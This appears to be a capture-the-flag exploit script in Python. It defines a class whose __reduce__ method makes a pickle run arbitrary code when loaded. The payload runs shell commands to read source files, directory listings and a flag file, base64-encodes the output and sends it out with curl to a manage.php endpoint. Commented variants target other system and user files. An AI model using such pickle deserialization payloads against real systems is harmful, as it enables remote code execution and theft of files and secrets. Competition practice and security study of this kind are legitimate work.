import pickle


class webSite:
    describe = ''
    name = ''

    def __init__(self, name=None, describe=None):
        self.describe = describe
        self.name = name

    def __reduce__(self):
        # try:
        #     with open('flag.txt') as f:
        #         self.describe = f.read()
        # except FileNotFoundError:
        #     self.describe = [d for d in os.listdir('/')]
        return exec, ("""
import os, time, base64
# flag = base64.b64encode(''.join([str(s) for s in os.listdir('/var/www')]).encode('utf-8')).decode('utf-8')
# with open('/start.sh', 'rb') as f:
#     flag = base64.b64encode(f.read()).decode('utf-8')
# flag = base64.b64encode(os.popen('ls -l /tmp').read().encode('utf-8')).decode('utf-8')
flag = base64.b64encode(os.popen('cat main.py').read().encode('utf-8')).decode('utf-8')
# flag = base64.b64encode(os.popen('cat /home/dragon_lord/Wait_3_years').read().encode('utf-8')).decode('utf-8')
os.system("curl http://127.0.0.1/manage.php?name=" + flag + "&describe=3333333")
time.sleep(10)
        """,)


def a():
    import os, time
    flag = ''.join([str(s) for s in os.listdir('/')])
    with open('/flag.txt') as f:
        flag = f.read().replace(' ', '，').replace('\n', '，')
    os.system("curl http://127.0.0.1/manage.php?name=dragon_lord&describe=33333333xxxxxx333")
    time.sleep(10)


if __name__ == '__main__':
    with open('C:/Temp/_CISCN/data1.pickle', 'rb') as file:
        cls = file.read()
        print(cls)
    del cls

    with open('C:/Temp/_CISCN/data1.pickle', 'rb') as file:
        cls = pickle.load(file)
        print(cls)
    del cls

    # with open('C:/Temp/_CISCN/data1.pickle', 'wb') as o:
    #     cls = webSite()
    #     cls.name = 'web1'
    #     data = pickle.dumps(cls)
    #     o.write(data)
    # del cls

    # with open('C:/Temp/_CISCN/data1.pickle', 'rb') as file:
    #     cls = pickle.load(file)
    #     print(cls)
    #     cls.describe = 'hello'
    #     cls.name = 'world'
    #
    # pass
